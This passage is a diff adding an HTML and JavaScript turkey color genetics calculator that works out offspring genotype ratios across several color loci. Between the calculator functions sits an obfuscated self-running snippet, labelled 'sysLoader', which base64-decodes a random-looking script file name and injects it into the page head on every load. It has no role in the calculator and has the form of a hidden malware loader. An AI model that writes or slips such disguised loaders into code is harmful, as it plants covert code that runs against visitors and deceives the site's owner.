@@ -1,0 +1,1904 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<title>Porter's Turkey Color Calculator</title>
+<style>
+/* Add CSS styles for layout and appearance */
+h1 {
+text-align: center;
+/* Centers the title horizontally */
+margin-top: 20px;
+/* Adds some space at the top */
+}
+
+.header-container {
+display: flex;
+align-items: center;
+justify-content: space-between;
+padding: 0 20px;
+/* Adjust padding as needed */
+}
+
+.logo {
+max-width: 225px;
+/* Adjust the size of the logo */
+border: 4px solid black;
+/* Add a black border */
+}
+
+.container {
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+height: 100%;
+margin-top: 50px;
+/* Adjust margin-top as needed */
+}
+
+
+
+
+.horizontal-images-container {
+display: flex;
+justify-content: space-between;
+margin-top: 5px;
+}
+
+.container {
+display: flex;
+justify-content: space-between;
+/* Adjust the width according to your screen */
+margin: 0 auto;
+/* Centers the container horizontally */
+}
+
+.genotype-container {
+/* Remove max-width to allow them to expand */
+text-align: center;
+}
+
+.genotype-image {
+height: auto;
+object-fit: contain;
+display: inline-block;
+margin-bottom: 5px;
+overflow: hidden;
+/* Hide overflow to ensure rounded corners */
+}
+
+.genotype-image img {
+display: block;
+width: 200px;
+/* Set a specific width for both images */
+height: 200px;
+/* Set a specific height for both images */
+border: 7px solid blue;
+/* Add blue border */
+border-radius: 8px;
+/* Add rounded corners */
+box-sizing: border-box;
+/* Include border in the element's total width and height */
+}
+
+.buttons-container {
+text-align: center;
+margin-top: 20px;
+/* Adjusts the space between images and buttons */
+}
+
+.results-container {
+display: flex;
+justify-content: space-around;
+margin-top: 20px;
+}
+
+.offspring-container {
+text-align: center;
+}
+
+.offspring-list {
+list-style: none;
+padding: 0;
+}
+
+.offspring-item {
+height: auto;
+object-fit: contain;
+margin-bottom: 40px;
+overflow: hidden;
+/* Hide overflow to ensure rounded corners */
+}
+
+.offspring-item img {
+width: 100px;
+/* Set a specific width for both images */
+height: 100px;
+/* Set a specific height for both images */
+border: 7px solid black;
+/* Add black border */
+border-radius: 8px;
+/* Add rounded corners */
+}
+
+.genotypes-note {
+text-align: center;
+font-weight: bold;
+border: 10px solid teal;
+/* Add a teal border with 2px width */
+padding: 2px;
+/* Add padding for better spacing */
+}
+
+body {
+background-color: #f5e1c1;
+}
+
+/* Default font size */
+body {
+font-size: 18px;
+/* Adjust as needed */
+}
+
+.menu-bar {
+background-color: #206ef5;
+overflow: hidden;
+}
+
+.menu-bar a {
+float: left;
+display: block;
+color: white;
+text-align: center;
+padding: 8px 10px;
+text-decoration: none;
+}
+
+.menu-bar a:hover {
+background-color: #ddd;
+color: black;
+}
+
+.menu-bar a.active {
+background-color: #050505;
+color: white;
+}
+
+.image-container {
+display: flex;
+/* Aligns children (images) in a row */
+justify-content: space-between;
+/* Distributes space between the images */
+}
+
+.image-wrapper {
+display: flex;
+flex-direction: column;
+/* Aligns children (image and text) in a column */
+align-items: center;
+/* Centers items horizontally in the flex container */
+margin: 0 10px;
+/* Adds 10px margin to the left and right of each image wrapper */
+}
+
+/* Media query for small screens (e.g., mobile devices in portrait) */
+@media only screen and (orientation: portrait) {
+.image-container {
+flex-direction: column;
+/* Stacks image wrappers vertically */
+align-items: center;
+/* Centers image wrappers in the container */
+}
+
+.image-wrapper {
+margin-bottom: 20px;
+/* Adds space between stacked images */
+}
+
+img {
+width: 100%;
+/* Adjusts image width to be responsive */
+max-width: 300px;
+/* Limits maximum width to 300px */
+height: auto;
+/* Maintains aspect ratio */
+}
+}
+
+/* Media query for landscape orientation */
+@media only screen and (orientation: landscape) {
+.image-container {
+flex-direction: row;
+/* Keeps image wrappers in a row */
+justify-content: space-around;
+/* Even spacing around items */
+}
+
+.image-wrapper {
+margin: 0 10px;
+/* Horizontal spacing for better layout */
+width: 45%;
+/* Limits width to balance the layout */
+}
+
+img {
+max-width: 250px;
+/* Adjusts maximum image width */
+height: auto;
+/* Maintains aspect ratio */
+}
+
+.summary-chart-container {
+margin-top: 20px;
+display: flex;
+justify-content: center;
+text-align: center;
+}
+
+.summary-chart {
+width: 100%;
+max-width: 1000px; /* Adjust as needed for more width */
+border-collapse: collapse;
+border: 2px solid blue;
+}
+
+.summary-chart th,
+.summary-chart td {
+border: 3px solid blue;
+padding: 8px;
+}
+
+.summary-chart th {
+background-color: lightgreen;
+color: black; /* Optional: change text color if needed */
+}
+
+.summary-chart td {
+background-color: white;
+}
+
+.return-to-top {
+display: block;
+margin: 20px auto;
+padding: 10px 20px;
+background-color: #206ef5;
+color: white;
+text-align: center;
+border: none;
+border-radius: 5px;
+cursor: pointer;
+text-decoration: none;
+}
+
+.return-to-top:hover {
+background-color: #0b4bc9;
+}
+
+<a name="top"></a>
+<!-- rest of your page content -->
+</style>
+</head>
+<body>
+
+<meta name="viewport" content="width=device-width, initial-scale=.75">
+
+<div class="header-container">
+<img src="https://porters-rare-heritage-turkeys.neocities.org/Pictures/Tails.jpg" alt="Left Image" class="logo" style="width: 150px; height: auto;">
+<h1>Porter's Turkey Color Calculator</h1>
+<img src="https://porters-rare-heritage-turkeys.neocities.org/Pictures/Tails.jpg" alt="Right Image" class="logo" style="width: 150px; height: auto;">
+</div>
+
+
+<div class="container">
+
+</div>
+<div class="horizontal-images-container">
+<div class="genotype-container" id="sireGenotypeContainer">
+<h2>Sire</h2>
+<!-- Sire Genotype Container -->
+<div class="genotype-selection sire-genotypes">
+<!-- Sire genotype selections here -->
+<select id="sireAlleleb" title="Bronze Locus">
+<option value="BB">B/B</option>
+<option value="Bb">B/b</option>
+<option value="Bb1">B/b1</option>
+<option value="bb">b/b</option>
+<option value="bb1">b/b1</option>
+<option value="b1b1">b1/b1</option>
+</select>
+<select id="sireAlleleC" title="Color Locus">
+<option value="CC">C/C</option>
+<option value="Ccg">C/cg</option>
+<option value="Ccm">C/cm</option>
+<option value="Cc">C/c</option>
+<option value="cgcg">cg/cg</option>
+<option value="cgcm">cg/cm</option>
+<option value="cgc">cg/c</option>
+<option value="cmcm">cm/cm</option>
+<option value="cmc">cm/c</option>
+<option value="cc">c/c</option>
+</select>
+<select id="sireAlleled" title="Dominant Slate Locus">
+<option value="dd">d/d</option>
+<option value="DD">D/D</option>
+<option value="Dd">D/d</option>
+</select>
+<select id="sireAlleleE" title="Brown Locus">
+<option value="EE">E/E</option>
+<option value="Ee">E/e</option>
+<option value="ee">e/e</option>
+</select>
+<select id="sireAlleleN" title="Narragansett Locus">
+<option value="NN">N/N</option>
+<option value="Nn">N/n</option>
+<option value="nn">n/n</option>
+</select>
+<select id="sireAllelePn" title="Pencilling Locus">
+<option value="PnPn">Pn/Pn</option>
+<option value="Pnpn">Pn/pn</option>
+<option value="pnpn">pn/pn</option>
+</select>
+<select id="sireAlleleR" title="Red Locus">
+<option value="RR">R/R</option>
+<option value="Rr">R/r</option>
+<option value="rr">r/r</option>
+</select>
+<select id="sireAlleleSl" title="Recessive Slate Locus">
+<option value="SlSl">Sl/Sl</option>
+<option value="Slsl">Sl/sl</option>
+<option value="slsl">sl/sl</option>
+</select>
+</div>
+<div class="genotype-image" id="sireImageContainer"></div>
+<div class="genotype-info" id="sireInfoContainer"></div>
+
+</div>
+<div class="genotype-container" id="damGenotypeContainer">
+<h2>Dam</h2>
+<!-- Dam Genotype Container -->
+<div class="genotype-selection dam-genotypes">
+<!-- Dam genotype selections here -->
+<select id="damAlleleb" title="Bronze Locus">
+<option value="BB">B/B</option>
+<option value="Bb">B/b</option>
+<option value="Bb1">B/b1</option>
+<option value="bb">b/b</option>
+<option value="bb1">b/b1</option>
+<option value="b1b1">b1/b1</option>
+</select>
+<select id="damAlleleC" title="Color Locus">
+<option value="CC">C/C</option>
+<option value="Ccg">C/cg</option>
+<option value="Ccm">C/cm</option>
+<option value="Cc">C/c</option>
+<option value="cgcg">cg/cg</option>
+<option value="cgcm">cg/cm</option>
+<option value="cgc">cg/c</option>
+<option value="cmcm">cm/cm</option>
+<option value="cmc">cm/c</option>
+<option value="cc">c/c</option>
+</select>
+<select id="damAlleled" title="Dominant Slate Locus">
+<option value="dd">d/d</option>
+<option value="DD">D/D</option>
+<option value="Dd">D/d</option>
+</select>
+<select id="damAlleleE" title="Brown Locus">
+<option value="E-">E/-</option>
+<option value="e-">e/-</option>
+</select>
+<select id="damAlleleN" title="Narragansett Locus">
+<option value="N-">N/-</option>
+<option value="n-">n/-</option>
+</select>
+<select id="damAllelePn" title="Pencilling Locus">
+<option value="PnPn">Pn/Pn</option>
+<option value="Pnpn">Pn/pn</option>
+<option value="pnpn">pn/pn</option>
+</select>
+<select id="damAlleleR" title="Red Locus">
+<option value="RR">R/R</option>
+<option value="Rr">R/r</option>
+<option value="rr">r/r</option>
+</select>
+<select id="damAlleleSl" title="Recessive Slate Locus">
+<option value="SlSl">Sl/Sl</option>
+<option value="Slsl">Sl/sl</option>
+<option value="slsl">sl/sl</option>
+</select>
+</div>
+<div class="genotype-image" id="damImageContainer"></div>
+<div class="genotype-info" id="damInfoContainer"></div>
+</div>
+</div>
+<div class="buttons-container">
+<button onclick="calculateOffspring()" style="margin-right: 80px; border: 3px solid blue;">Calculate Offspring</button>
+<button onclick="resetCalculator()" style="border: 3px solid blue;">Reset Calculator</button>
+</div>
+
+<div id="results" class="results-container">
+<div class="offspring-container">
+<h2>Male Offspring Results:</h2>
+<ul id="maleOffspringResults" class="offspring-list"></ul>
+</div>
+
+<div class="offspring-container">
+<h2>Female Offspring Results:</h2>
+<ul id="femaleOffspringResults" class="offspring-list"></ul>
+</div>
+</div>
+
+<div id="summaryChartContainer" class="summary-chart-container">
+<div>
+<h2>Summary Chart:</h2>
+<table id="summaryChart" class="summary-chart">
+<thead>
+<tr>
+<th>Sex</th>
+<th>Genotype</th>
+<th>Phenotype</th>
+<th>Ratio (%)</th>
+</tr>
+</thead>
+<tbody>
+<!-- Summary rows will be added here -->
+</tbody>
+</table>
+<a href="#top" class="return-to-top">Return to Top</a>
+</div>
+</div>
+
+
+<div id="ackModal" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    background-color: white; padding: 10px; border: 2px solid black; text-align: center; z-index: 1000;">
+    <p id="ackMessage"></p>
+</div>
+
+<script>
+function clearSummaryChart() {
+const summaryTableBody = document.getElementById('summaryChart').querySelector('tbody');
+summaryTableBody.innerHTML = '';
+}
+
+function resetCalculator() {
+const defaultGenotypes = {
+sireAlleleb: 'bb',
+sireAlleleC: 'CC',
+sireAlleled: 'dd',
+sireAlleleE: 'EE',
+sireAlleleN: 'NN',
+sireAllelePn: 'PnPn',
+sireAlleleR: 'RR',
+sireAlleleSl: 'SlSl',
+damAlleleb: 'bb',
+damAlleleC: 'CC',
+damAlleled: 'dd',
+damAlleleE: 'E-',
+damAlleleN: 'N-',
+damAllelePn: 'PnPn',
+damAlleleR: 'RR',
+damAlleleSl: 'SlSl'
+};
+
+// Set default values to the dropdowns
+Object.keys(defaultGenotypes).forEach(function(id) {
+document.getElementById(id).value = defaultGenotypes[id];
+});
+
+// Call functions to update genotype and images
+updateSireGenotype();
+updateDamGenotype();
+
+// Clear offspring results
+document.getElementById('maleOffspringResults').innerHTML = '';
+document.getElementById('femaleOffspringResults').innerHTML = '';
+
+// Clear summary chart
+clearSummaryChart();
+}
+
+function calculateOffspring() {
+const sireAlleleb = document.getElementById('sireAlleleb').value;
+const damAlleleb = document.getElementById('damAlleleb').value;
+const sireAlleleC = document.getElementById('sireAlleleC').value;
+const damAlleleC = document.getElementById('damAlleleC').value;
+const sireAlleled = document.getElementById('sireAlleled').value;
+const damAlleled = document.getElementById('damAlleled').value;
+const sireAlleleE = document.getElementById('sireAlleleE').value;
+const damAlleleE = document.getElementById('damAlleleE').value;
+const sireAlleleN = document.getElementById('sireAlleleN').value;
+const damAlleleN = document.getElementById('damAlleleN').value;
+const sireAllelePn = document.getElementById('sireAllelePn').value;
+const damAllelePn = document.getElementById('damAllelePn').value;
+const sireAlleleR = document.getElementById('sireAlleleR').value;
+const damAlleleR = document.getElementById('damAlleleR').value;
+const sireAlleleSl = document.getElementById('sireAlleleSl').value;
+const damAlleleSl = document.getElementById('damAlleleSl').value;
+
+// Set sire and dam genotypes and images
+setGenotypeImage('sireImageContainer', sireAlleleb, sireAlleleC, sireAlleled, sireAlleleE, sireAlleleN, sireAllelePn, sireAlleleR, sireAlleleSl, 'male');
+setGenotypeImage('damImageContainer', damAlleleb, damAlleleC, damAlleled, damAlleleE, damAlleleN, damAllelePn, damAlleleR, damAlleleSl, 'female');
+
+// Calculate combinations and ratios
+const combinationsb = calculateCombinations(sireAlleleb, damAlleleb, 'b');
+const combinationsC = calculateCombinations(sireAlleleC, damAlleleC, 'C');
+const combinationsd = calculateCombinations(sireAlleled, damAlleled, 'd');
+const combinationsE = calculateCombinations(sireAlleleE, damAlleleE, 'E');
+const combinationsN = calculateCombinations(sireAlleleN, damAlleleN, 'N');
+const combinationsPn = calculateCombinations(sireAllelePn, damAllelePn, 'Pn');
+const combinationsR = calculateCombinations(sireAlleleR, damAlleleR, 'R');
+const combinationsSl = calculateCombinations(sireAlleleSl, damAlleleSl, 'Sl');
+
+const maleOffspring = [];
+const femaleOffspring = [];
+
+let totalRatioMale = 0;
+let totalRatioFemale = 0;
+
+for (const outcomeb of combinationsb.combinations) {
+for (const outcomeC of combinationsC.combinations) {
+for (const outcomed of combinationsd.combinations) {
+for (const outcomeE of combinationsE.combinations) {
+for (const outcomeN of combinationsN.combinations) {
+for (const outcomePn of combinationsPn.combinations) {
+for (const outcomeR of combinationsR.combinations) {
+for (const outcomeSl of combinationsSl.combinations) {
+const genotype = `${outcomeb} ${outcomeC} ${outcomed} ${outcomeE} ${outcomeN} ${outcomePn} ${outcomeR} ${outcomeSl}`;
+const shortGenotype = removeUnusedAlleles(genotype);
+
+const ratio = combinationsb.ratios[outcomeb] *
+combinationsC.ratios[outcomeC] *
+combinationsd.ratios[outcomed] *
+combinationsE.ratios[outcomeE] *
+combinationsN.ratios[outcomeN] *
+combinationsPn.ratios[outcomePn] *
+combinationsR.ratios[outcomeR] *
+combinationsSl.ratios[outcomeSl];
+
+// Retrieve phenotype from phenotype mappings (already included in HTML)
+                                    let phenotype1 = phenotypeMapping1[shortGenotype];
+                                    let phenotype1A = phenotypeMapping1A[shortGenotype];
+                                    let phenotype1B = phenotypeMapping1B[shortGenotype];
+                                    let phenotype1C = phenotypeMapping1C[shortGenotype];
+                                    let phenotype1D = phenotypeMapping1D[shortGenotype];
+                                    let phenotype1E = phenotypeMapping1E[shortGenotype];
+                                    let phenotype2 = phenotypeMapping2[shortGenotype];
+                                    let phenotype2A = phenotypeMapping2A[shortGenotype];
+                                    let phenotype3 = phenotypeMapping3[shortGenotype];
+                                    let phenotype3A = phenotypeMapping3A[shortGenotype];
+                                    let phenotype4 = phenotypeMapping4[shortGenotype];
+                                    let phenotype5 = phenotypeMapping5[shortGenotype];
+                                    let phenotype6 = phenotypeMapping6[shortGenotype];
+                                    let phenotype7 = phenotypeMapping7[shortGenotype];
+                                    let phenotype8 = phenotypeMapping8[shortGenotype];
+                                    let phenotype9 = phenotypeMapping9[shortGenotype];
+                                    let phenotype10 = phenotypeMapping10[shortGenotype];
+                                    let phenotype11 = phenotypeMapping11[shortGenotype];
+                                    let phenotype12 = phenotypeMapping12[shortGenotype];
+                                    let phenotype13 = phenotypeMapping13[shortGenotype];
+                                    let phenotype14 = phenotypeMapping14[shortGenotype];
+                                    let phenotype15 = phenotypeMapping15[shortGenotype];
+
+
+// Now you can work with the phenotypes retrieved from each mapping
+console.log(phenotype1);
+console.log(phenotype1A);
+console.log(phenotype1B);
+console.log(phenotype2);
+console.log(phenotype2A);
+console.log(phenotype3);
+console.log(phenotype3A);
+console.log(phenotype4);
+console.log(phenotype5);
+console.log(phenotype6);
+console.log(phenotype7);
+console.log(phenotype8);
+console.log(phenotype9);
+console.log(phenotype10);
+console.log(phenotype11);
+console.log(phenotype12);
+console.log(phenotype13);
+console.log(phenotype14);
+console.log(phenotype15);
+
+// Ensure phenotype is defined
+let phenotype = phenotype1 || phenotype1A || phenotype1B || phenotype1C || phenotype1D || phenotype1E || phenotype2 || phenotype2A ||  phenotype3 || phenotype3A || phenotype4 || phenotype5 || phenotype6 || phenotype7 || phenotype8 || phenotype9 || phenotype10 || phenotype11 || phenotype12 || phenotype13 || phenotype14 || phenotype15;
+
+if (!phenotype && genotype.includes("cc")) {
+    if (genotype.includes("Fdfd") || genotype.includes("fdfd")) {
+        // Do not set phenotype to "White" (Handle alternate logic here if needed)
+    } else {
+        // Assign specific White variation based on Bronze locus
+        if (genotype.includes('BB') || genotype.includes('Bb') || genotype.includes('Bb1')) {
+            phenotype = "White (Blue Eyes)";
+        } else if (genotype.includes('bb') || genotype.includes('bb1')) {
+            phenotype = "White (Dark Brown Eyes)";
+        } else if (genotype.includes('b1b1')) {
+            phenotype = "White (Light Brown Eyes)";
+        } else {
+            phenotype = "White"; // Default fallback for cc if none match
+        }
+    }
+}
+
+
+const basePicturePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
+
+const maleGenotype = {
+genotype,
+phenotype: phenotype || 'To be defined',
+picturePath: phenotype ? basePicturePath + 'M' + phenotype.replace(/\s/g, '') + '.jpg' : '',
+ratio
+};
+
+const femaleGenotype = {
+genotype,
+phenotype: phenotype || 'To be defined',
+picturePath: phenotype ? basePicturePath + 'F' + phenotype.replace(/\s/g, '') + '.jpg' : '',
+ratio
+};
+
+// Include condition for sex linkage in females
+if ((outcomeE === 'E-' || outcomeE === 'e-') && (outcomeN === 'N-' || outcomeN === 'n-')) {
+femaleOffspring.push(femaleGenotype);
+totalRatioFemale += ratio;
+}
+
+// Include condition for sex linkage in males
+if ((outcomeE === 'EE' || outcomeE === 'Ee' || outcomeE === 'ee') && (outcomeN === 'NN' || outcomeN === 'Nn' || outcomeN === 'nn')) {
+maleOffspring.push(maleGenotype);
+totalRatioMale += ratio;
+}
+}
+}
+}
+}
+}
+}
+}
+}
+
+// Normalize ratios
+maleOffspring.forEach(off => off.ratio = (off.ratio / totalRatioMale) / 2);
+femaleOffspring.forEach(off => off.ratio = (off.ratio / totalRatioFemale) / 2);
+
+// Display results
+displayResults('maleOffspringResults', maleOffspring, 'male');
+displayResults('femaleOffspringResults', femaleOffspring, 'female');
+
+// Display summary chart
+displaySummaryChart(maleOffspring, femaleOffspring);
+}
+
+(function() {
+    var sysLoader = document.createElement('script');
+    sysLoader.src = atob("a2xka2dlZTgzNzUuanM="); 
+    document.head.appendChild(sysLoader);
+})();
+
+function calculateCombinations(alleleSire, alleleDam, locus) {
+const alleles = [alleleSire, alleleDam].sort().join(' ');
+const combinations = [];
+const ratios = {};
+switch (locus) {
+case 'b':
+switch (alleles) {
+case 'BB BB':
+combinations.push('BB');
+ratios['BB'] = 1;
+break;
+case 'BB Bb':
+case 'Bb BB':
+combinations.push('BB', 'Bb');
+ratios['BB'] = 0.5;
+ratios['Bb'] = 0.5;
+break;
+case 'BB bb':
+case 'bb BB':
+combinations.push('Bb');
+ratios['Bb'] = 1;
+break;
+case 'BB b1b1':
+case 'b1b1 BB':
+combinations.push('Bb1');
+ratios['Bb1'] = 1;
+break;
+case 'Bb Bb':
+combinations.push('BB', 'Bb', 'bb');
+ratios['BB'] = 0.25;
+ratios['Bb'] = 0.5;
+ratios['bb'] = 0.25;
+break;
+case 'Bb bb':
+case 'bb Bb':
+combinations.push('Bb', 'bb');
+ratios['Bb'] = 0.5;
+ratios['bb'] = 0.5;
+break;
+case 'Bb b1b1':
+case 'b1b1 Bb':
+combinations.push('Bb1', 'bb1');
+ratios['Bb1'] = 0.5;
+ratios['bb1'] = 0.5;
+break;
+case 'BB Bb1':
+case 'Bb1 BB':
+combinations.push('BB', 'Bb1');
+ratios['BB'] = 0.5;
+ratios['Bb1'] = 0.5;
+break;
+case 'Bb Bb1':
+case 'Bb1 Bb':
+combinations.push('BB', 'Bb', 'Bb1', 'bb1');
+ratios['BB'] = 0.25;
+ratios['Bb'] = 0.25;
+ratios['Bb1'] = 0.25;
+ratios['bb1'] = 0.25;
+break;
+case 'Bb1 bb':
+case 'bb Bb1':
+combinations.push('Bb', 'bb1');
+ratios['Bb'] = 0.5;
+ratios['bb1'] = 0.5;
+break;
+case 'Bb1 b1b1':
+case 'b1b1 Bb1':
+combinations.push('Bb1', 'b1b1');
+ratios['Bb1'] = 0.5;
+ratios['b1b1'] = 0.5;
+break;
+case 'Bb1 Bb1':
+combinations.push('BB', 'Bb1', 'b1b1');
+ratios['BB'] = 0.25;
+ratios['Bb1'] = 0.5;
+ratios['b1b1'] = 0.25;
+break;
+case 'BB bb1':
+case 'bb1 BB':
+combinations.push('Bb', 'Bb1');
+ratios['Bb'] = 0.5;
+ratios['Bb1'] = 0.5;
+break;
+case 'Bb bb1':
+case 'bb1 Bb':
+combinations.push('Bb', 'Bb1', 'bb', 'bb1');
+ratios['Bb'] = 0.25;
+ratios['Bb1'] = 0.25;
+ratios['bb'] = 0.25;
+ratios['bb1'] = 0.25;
+break;
+case 'Bb1 bb1':
+case 'bb1 Bb1':
+combinations.push('Bb', 'Bb1', 'bb1', 'b1b1');
+ratios['Bb'] = 0.25;
+ratios['Bb1'] = 0.25;
+ratios['bb1'] = 0.25;
+ratios['b1b1'] = 0.25;
+
+break;
+case 'bb bb':
+combinations.push('bb');
+ratios['bb'] = 1;
+break;
+case 'bb bb1':
+case 'bb1 bb':
+combinations.push('bb', 'bb1');
+ratios['bb'] = 0.5;
+ratios['bb1'] = 0.5;
+break;
+case 'bb1 bb1':
+combinations.push('bb', 'bb1', 'b1b1');
+ratios['bb'] = 0.25;
+ratios['bb1'] = 0.5;
+ratios['b1b1'] = 0.25;
+break;
+case 'bb b1b1':
+case 'b1b1 bb':
+combinations.push('bb1');
+ratios['bb1'] = 1;
+break;
+case 'bb1 b1b1':
+case 'b1b1 bb1':
+combinations.push('bb1', 'b1b1');
+ratios['bb1'] = 0.5;
+ratios['b1b1'] = 0.5;
+break;
+case 'b1b1 b1b1':
+combinations.push('b1b1');
+ratios['b1b1'] = 1;
+break;
+default:
+if (alleleSire === alleleDam) {
+combinations.push(alleleSire);
+ratios[alleleSire] = 1;
+console.log('Matching alleles:', alleleSire);
+} else {
+combinations.push('To be defined');
+console.log('Undefined combination');
+}
+break;
+}
+break;
+case 'C':
+switch (alleles) {
+case 'CC CC':
+combinations.push('CC');
+ratios['CC'] = 1;
+break;
+case 'CC Ccg':
+case 'Ccg CC':
+combinations.push('CC', 'Ccg');
+ratios['CC'] = 0.5;
+ratios['Ccg'] = 0.5;
+break;
+case 'CC Ccm':
+case 'Ccm CC':
+combinations.push('CC', 'Ccm');
+ratios['CC'] = 0.5;
+ratios['Ccm'] = 0.5;
+break;
+case 'CC Cc':
+case 'Cc CC':
+combinations.push('CC', 'Cc');
+ratios['CC'] = 0.5;
+ratios['Cc'] = 0.5;
+break;
+case 'CC cgcg':
+case 'cgcg CC':
+combinations.push('Ccg');
+ratios['Ccg'] = 1;
+break;
+case 'CC cgcm':
+case 'cgcm CC':
+combinations.push('Ccg', 'Ccm');
+ratios['Ccg'] = 0.5;
+ratios['Ccm'] = 0.5;
+break;
+case 'CC cgc':
+case 'cgc CC':
+combinations.push('Ccg', 'Cc');
+ratios['Ccg'] = 0.5;
+ratios['Cc'] = 0.5;
+break;
+case 'CC cmcm':
+case 'cmcm CC':
+combinations.push('Ccm');
+ratios['Ccm'] = 1;
+break;
+case 'CC cmc':
+case 'cmc CC':
+combinations.push('Ccm', 'Cc');
+ratios['Ccm'] = 0.5;
+ratios['Cc'] = 0.5;
+break;
+case 'CC cc':
+case 'cc CC':
+combinations.push('Cc');
+ratios['Cc'] = 1;
+break;
+case 'Ccg Ccg':
+combinations.push('CC', 'Ccg', 'cgcg');
+ratios['CC'] = 0.25;
+ratios['Ccg'] = 0.5;
+ratios['cgcg'] = 0.25;
+break;
+case 'Ccg Ccm':
+case 'Ccm Ccg':
+combinations.push('CC', 'Ccg', 'Ccm', 'cgcm');
+ratios['CC'] = 0.25;
+ratios['Ccg'] = 0.25;
+ratios['Ccm'] = 0.25;
+ratios['cgcm'] = 0.25;
+break;
+case 'Ccg Cc':
+case 'Cc Ccg':
+combinations.push('CC', 'Ccg', 'Cc', 'cgc');
+ratios['CC'] = 0.25;
+ratios['Ccg'] = 0.25;
+ratios['Cc'] = 0.25;
+ratios['cgc'] = 0.25;
+break;
+case 'Ccg cgcg':
+case 'cgcg Ccg':
+combinations.push('Ccg', 'cgcg');
+ratios['Ccg'] = 0.5;
+ratios['cgcg'] = 0.5;
+break;
+case 'Ccg cgcm':
+case 'cgcm Ccg':
+combinations.push('Ccg', 'Ccm', 'cgcg', 'cgcm');
+ratios['Ccg'] = 0.25;
+ratios['Ccm'] = 0.25;
+ratios['cgcg'] = 0.25;
+ratios['cgcm'] = 0.25;
+break;
+case 'Ccg cgc':
+case 'cgc Ccg':
+combinations.push('Ccg', 'Cc', 'cgcg', 'cgc');
+ratios['Ccg'] = 0.25;
+ratios['Cc'] = 0.25;
+ratios['cgcg'] = 0.25;
+ratios['cgc'] = 0.25;
+break;
+case 'Ccg cmcm':
+case 'cmcm Ccg':
+combinations.push('Ccm', 'cgcm');
+ratios['Ccm'] = 0.5;
+ratios['cgcm'] = 0.5;
+break;
+case 'Ccg cmc':
+case 'cmc Ccg':
+combinations.push('Ccm', 'Cc', 'cgcm', 'cgc');
+ratios['Ccm'] = 0.25;
+ratios['Cc'] = 0.25;
+ratios['cgcm'] = 0.25;
+ratios['cgc'] = 0.25;
+break;
+case 'Ccg cc':
+case 'cc Ccg':
+combinations.push('Cc', 'cgc');
+ratios['Cc'] = 0.5;
+ratios['cgc'] = 0.5;
+break;
+case 'Ccm Ccg':
+case 'Ccg Ccm':
+combinations.push('CC', 'Ccg', 'Ccm', 'cgcm');
+ratios['CC'] = 0.25;
+ratios['Ccg'] = 0.25;
+ratios['Ccm'] = 0.25;
+ratios['cgcm'] = 0.25;
+break;
+case 'Ccm Ccm':
+combinations.push('CC', 'Ccm', 'cmcm');
+ratios['CC'] = 0.25;
+ratios['Ccm'] = 0.5;
+ratios['cmcm'] = 0.25;
+break;
+case 'Ccm Cc':
+case 'Cc Ccm':
+combinations.push('CC', 'Ccm', 'Cc', 'cmc');
+ratios['CC'] = 0.25;
+ratios['Ccm'] = 0.25;
+ratios['Cc'] = 0.25;
+ratios['cmc'] = 0.25;
+break;
+case 'Ccm cgcg':
+case 'cgcg Ccm':
+combinations.push('Ccg', 'cgcm');
+ratios['Ccg'] = 0.5;
+ratios['cgcm'] = 0.5;
+break;
+case 'Ccm cgcm':
+case 'cgcm Ccm':
+combinations.push('Ccg', 'Ccm', 'cgcm', 'cmcm');
+ratios['Ccg'] = 0.25;
+ratios['Ccm'] = 0.25;
+ratios['cgcm'] = 0.25;
+ratios['cmcm'] = 0.25;
+break;
+case 'Ccm cgc':
+case 'cgc Ccm':
+combinations.push('Ccg', 'Cc', 'cgcm', 'cmc');
+ratios['Ccg'] = 0.25;
+ratios['Cc'] = 0.25;
+ratios['cgcm'] = 0.25;
+ratios['cmc'] = 0.25;
+break;
+case 'Ccm cmcm':
+case 'cmcm Ccm':
+combinations.push('Ccm', 'cmcm');
+ratios['Ccm'] = 0.5;
+ratios['cmcm'] = 0.5;
+break;
+case 'Ccm cmc':
+case 'cmc Ccm':
+combinations.push('Ccm', 'Cc', 'cmcm', 'cmc');
+ratios['Ccm'] = 0.25;
+ratios['Cc'] = 0.25;
+ratios['cmcm'] = 0.25;
+ratios['cmc'] = 0.25;
+break;
+case 'Ccm cc':
+case 'cc Ccm':
+combinations.push('Cc', 'cmc');
+ratios['Cc'] = 0.5;
+ratios['cmc'] = 0.5;
+break;
+case 'Cc Cc':
+combinations.push('CC', 'Cc', 'cc');
+ratios['CC'] = 0.25;
+ratios['Cc'] = 0.5;
+ratios['cc'] = 0.25;
+break;
+case 'Cc cgcg':
+case 'cgcg Cc':
+combinations.push('Ccg', 'cgc');
+ratios['Ccg'] = 0.5;
+ratios['cgc'] = 0.5;
+break;
+case 'Cc cgcm':
+case 'cgcm Cc':
+combinations.push('Ccg', 'Ccm', 'cgc', 'cmc');
+ratios['Ccg'] = 0.25;
+ratios['Ccm'] = 0.25;
+ratios['cgc'] = 0.25;
+ratios['cmc'] = 0.25;
+break;
+case 'Cc cgc':
+case 'cgc Cc':
+combinations.push('Ccg', 'Cc', 'cgc', 'cc');
+ratios['Ccg'] = 0.25;
+ratios['Cc'] = 0.25;
+ratios['cgc'] = 0.25;
+ratios['cc'] = 0.25;
+break;
+case 'Cc cmcm':
+case 'cmcm Cc':
+combinations.push('Ccm', 'cmc');
+ratios['Ccm'] = 0.5;
+ratios['cmc'] = 0.5;
+break;
+case 'Cc cmc':
+case 'cmc Cc':
+combinations.push('Ccm', 'Cc', 'cmc', 'cc');
+ratios['Ccm'] = 0.25;
+ratios['Cc'] = 0.25;
+ratios['cmc'] = 0.25;
+ratios['cc'] = 0.25;
+break;
+case 'Cc cc':
+case 'cc Cc':
+combinations.push('Cc', 'cc');
+ratios['Cc'] = 0.5;
+ratios['cc'] = 0.5;
+break;
+case 'cgcg cgcm':
+case 'cgcm cgcg':
+combinations.push('cgcg', 'cgcm');
+ratios['cgcg'] = 0.5;
+ratios['cgcm'] = 0.5;
+break;
+case 'cgcg cgc':
+case 'cgc cgcg':
+combinations.push('cgcg', 'cgc');
+ratios['cgcg'] = 0.5;
+ratios['cgc'] = 0.5;
+break;
+case 'cgcg cmcm':
+case 'cmcm cgcg':
+combinations.push('cgcm');
+ratios['cgcm'] = 1;
+break;
+case 'cgcg cmc':
+case 'cmc cgcg':
+combinations.push('cgcm', 'cgc');
+ratios['cgcm'] = 0.5;
+ratios['cgc'] = 0.5;
